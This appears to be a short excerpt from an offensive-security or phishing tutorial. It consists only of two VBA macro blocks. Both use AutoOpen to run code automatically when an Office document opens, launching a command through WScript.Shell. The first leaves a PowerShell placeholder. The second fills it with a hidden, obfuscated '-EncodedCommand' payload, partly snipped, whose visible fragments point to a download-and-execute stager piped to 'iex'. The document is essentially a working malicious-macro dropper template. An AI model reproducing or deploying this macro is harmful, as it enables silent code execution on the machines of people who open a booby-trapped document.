```
Sub DoStuff()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "<powershell command here>"
    Set wsh = Nothing
End Sub

Sub AutoOpen()
    DoStuff
End Sub

```



```
Sub DoStuff()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell -Sta -Nop -Window Hidden -EncodedCommand JABjAD0AbgBlAHcALQBvAGIAagBl[…snip…]AAUwB0AHMAMQAiACkAfABpAGUAeAA="
    Set wsh = Nothing
End Sub

Sub AutoOpen()
    DoStuff
End Sub

```
